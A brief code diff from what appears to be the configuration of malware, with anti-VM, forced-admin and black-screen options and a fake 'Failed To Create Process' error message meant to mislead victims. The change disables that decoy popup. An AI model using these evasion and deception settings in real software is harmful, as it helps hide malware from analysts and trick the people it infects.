@@ -12,7 +12,7 @@ config = {
     'antivm': False,  
     'force_admin': False, 
     'black_screen': True, 
-    'error': True, 
+    'error': False, 
     'error_message': 'Failed To Create Process\nclick "ok" to Continue',
 }
 
